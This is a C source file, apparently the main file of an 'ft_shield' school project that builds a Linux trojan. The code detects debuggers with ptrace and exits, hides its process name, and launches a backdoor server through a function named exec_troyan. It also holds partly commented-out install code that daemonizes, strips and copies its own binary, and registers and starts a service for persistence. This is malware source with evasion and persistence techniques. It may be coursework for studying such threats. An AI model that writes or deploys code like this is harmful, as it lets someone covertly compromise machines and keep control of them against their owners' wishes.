#include "ft_shield.h"

char path[PATH_MAX] = {0};
char dir_name[PATH_MAX] = {0};

bool	find_dir(char *dirname)
{
	char	*exec_paths = getenv("PATH");
	char	*location = strnstr(exec_paths, dirname, -1);

	if (location != NULL) {
		ft_dprintf(2, "found [%s]\n", location);
		return (true);
	}
	return (false);
}

bool	need_to_install_server(void)
{
	if (find_own_path(path, sizeof(path)) == -1) {
		ft_dprintf(2, "can't find own executable\n");
		exit(1);
	}

	memmove(dir_name, path, sizeof(path));
	dirname(dir_name);
	ft_dprintf(2, "dir_name: [%s]\n", dir_name);
	if (find_dir(dir_name) == true) {
		ft_dprintf(2, "We are already in the infected path: [%s]\n", dir_name);
		return (false);
	}
	ft_dprintf(2, "we need to install the server: [%s]\n", path);
	return (true);
}

void	compact_binary(void)
{
	char compact_cmd[PATH_MAX] = {0};
	char *filename = strdup(path);

	ft_dprintf(2, "binary: %s\n", filename);
	sprintf(compact_cmd, "cp %s %s.tmp; strip --strip-all %s.tmp; mv %s.tmp %s", filename, filename, filename, filename, filename);
	ft_dprintf(2, "cmd: %s\n", compact_cmd);
	free(filename);
	system(compact_cmd);

	char	*argv[] = {
		path, "--compacted", NULL
	};

	ft_dprintf(2, "binary compacted\n");
	ft_dprintf(2, "----------------\n");
	execv(path, argv);
	exit(1);
}

void	install_server(int argc, char **argv)
{
	if (argc == 1 && argv[1] == NULL)
		compact_binary();
	ft_dprintf(2, "running as compacted binary\n");
	ft_dprintf(2, "---------------------------\n");
	printf("%s\n", "psegura-");
	daemon(1, 1);
	copy_file(path, DEST_PATH);
	create_service();
	start_service();
}

void	exec_troyan(void)
{
	t_server server;

	memset(&server, 0, sizeof(t_server));
	ft_server(&server);
}

int main(int argc, char **argv)
{
	if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
		ft_dprintf(2, "Debugger detected\n");
		exit(1);
	}
	(void) argc;
	/* if (geteuid() != 0) {
		ft_dprintf(2, "Error: not running as root\n");
		return (1);
	}
	if (need_to_install_server()) {
		install_server(argc, argv);
	} else { */
		hide_process_name(argv); //TODO maybe change more things, like bin path and service name during install???
		exec_troyan();
	//}
	return (0);
}


/*
while daemon(1, 0) is enabled, stop server with
kill -9 $(ps -aux | grep ./ft_shield | grep -v exclude | cut -d' ' -f2)
*/